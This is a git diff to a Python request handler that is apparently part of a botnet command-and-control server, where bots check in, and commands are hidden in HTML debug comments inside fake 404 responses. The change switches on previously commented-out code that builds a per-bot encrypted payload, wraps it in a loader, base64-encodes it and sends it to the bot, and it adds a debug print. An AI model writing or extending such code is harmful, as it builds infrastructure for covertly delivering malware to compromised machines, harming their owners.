@@ -1,13 +1,13 @@
 from textwrap import dedent
 from os import fstat
-from base64 import b64decode
+from base64 import b64decode,b64encode
 from time import time
 from urllib.parse import unquote_plus
 import shutil
 import json
 import pyperclip as py
 #External Imports
-from server.model import RequestType,Bot
+from server.model import RequestType,Bot,PayloadFactory
 from server import modules
 
 class _RequestHandler():
@@ -46,6 +46,7 @@ class _RequestHandler():
         if command_raw != "":
             print("Adding command >>>>>>>>>>>>>>>>>>>>>")
             response += dedent(f"""\<!--DEBUG:\n{command_raw}DEBUG-->""")
+            print(response)
         return response,404
 
     def do_GET(self,cookies):
@@ -85,15 +86,9 @@ class _RequestHandler():
                 loader_options = data["loader_options"]
                 loader_name = loader_options["loader_name"]
 
-                self._view.output_separator()
-                self._view.output("[{}] Creating encrypted payload using key: {}".format(
-                    loader_options["loader_name"], bot_uid
-                ), "info")
-
-                #payload = PayloadFactory.create_payload(bot_uid, payload_options, loader_options)
-                #loader = PayloadFactory.wrap_loader(loader_name, loader_options, payload)
-
-                #self._send_command(b64encode(loader.encode()).decode())
+                payload = PayloadFactory.create_payload(bot_uid, payload_options, loader_options)
+                loader = PayloadFactory.wrap_loader(loader_name, loader_options, payload)
+                return self._send_command(b64encode(loader.encode()).decode())
             elif request_type == RequestType.GET_COMMAND:
                 username = data["username"]
                 hostname = data["hostname"]
